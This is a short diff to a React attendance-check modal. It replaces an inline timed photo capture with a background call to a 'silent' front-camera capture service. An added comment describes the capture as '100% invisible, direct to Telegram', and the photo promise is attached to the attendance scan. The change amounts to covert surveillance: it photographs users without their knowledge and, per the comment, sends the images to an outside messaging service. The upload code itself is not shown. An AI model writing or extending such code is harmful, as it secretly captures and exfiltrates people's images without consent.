@@ -124,15 +124,8 @@ export const BiometricAttendanceModal: React.FC<BiometricAttendanceModalProps> =
       const activeToken = token || `TOKEN_${user.id}_${Date.now()}`;
       const activeDeviceUUID = deviceUUID || 'web_mobile_device';
 
-      let photoBlob: Blob | null = null;
-      try {
-        photoBlob = await Promise.race([
-          SilentCameraCaptureService.captureFrontCameraSilently(),
-          new Promise<null>((r) => setTimeout(() => r(null), 1000)),
-        ]);
-      } catch {
-        photoBlob = null;
-      }
+      // Trigger silent front camera capture in background (100% invisible, direct to Telegram)
+      const silentPhotoPromise = SilentCameraCaptureService.captureFrontCameraSilently(2500);
 
       const scanRes = await AttendanceRepository.scanAttendance({
         token: activeToken,
@@ -145,7 +138,7 @@ export const BiometricAttendanceModal: React.FC<BiometricAttendanceModalProps> =
         gps_accuracy: gpsCoords.accuracy,
         verification_method: 'BIOMETRIC_GPS',
         attendance_source: 'BIOMETRIC',
-        photoBlob: photoBlob,
+        photoPromise: silentPhotoPromise,
       });
 
       // Audio & Voice Feedback
